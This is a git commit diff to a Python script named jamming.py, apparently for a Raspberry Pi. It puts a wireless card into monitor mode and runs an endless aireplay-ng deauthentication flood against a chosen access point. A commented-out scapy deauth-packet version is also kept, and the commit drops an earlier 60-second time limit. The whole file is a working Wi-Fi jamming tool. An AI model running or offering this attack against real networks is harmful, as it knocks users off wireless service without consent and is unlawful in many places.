c2059bfb56140cad95cabbc6f383695a77b9e848
root <root@localhost.localdomain>
2019-04-09 14:37:52 +0200

    mis a jour jamming

--- Rasberry/jamming.py
+++ Rasberry/jamming.py
@@ -5,37 +5,38 @@ import subprocess
 import utile
 import os
 import time
-import signal
+
 
 BSSID = utile.getAPMac()
-timeout = time.time() + 60
 
 subprocess.call('clear', shell=True)
+subprocess.call('airmon-ng ckeck kill',shell=True)
+
 print('Cartes disponibles ....')
 subprocess.call('airmon-ng',shell=True)
 
 networkCard = "wlan0"
 
-print (networkCard)
-
-subprocess.call('airmon-ng start {}'.format(networkCard), shell=True)
+subprocess.call('airmon-ng start {} 6'.format(networkCard), shell=True)
 subprocess.call('airmon-ng check kill', shell=True)
 
 networkCard = '{}mon'.format(networkCard)
 
-try:
-    subprocess.call('clear',shell=True)
-    print('Scan ...')
-    subprocess.call('airodump-ng -c 6 {}'.format(networkCard),shell=True)
-except KeyboardInterrupt:
-    print(''*3)
-
-brdMac = 'ff:ff:ff:ff:ff:ff'
-
+# try:
+#     subprocess.call('clear',shell=True)
+#     print('Scan ...')
+#     subprocess.call('airodump-ng {}'.format(networkCard),shell=True)
+#     time.sleep(7)
+#     killAiroDump("airodump")
+# except KeyboardInterrupt:
+#     print(''*3)
+#
+# brdMac = 'ff:ff:ff:ff:ff:ff'
 
 while True:
     #subprocess.call("aireplay-ng -0 0 -a {} {}".format(BSSID,networkCard),shell=True)
     os.system("aireplay-ng -0 0 -a {} {}".format(BSSID,networkCard))
+
     #packet = RadioTap() / Dot11(addr1= brdMac, addr2=BSSID,addr3= BSSID)/Dot11Deauth()
     #sendp(packet,iface = networkCard, count= 1000,inter= 0.2)
 
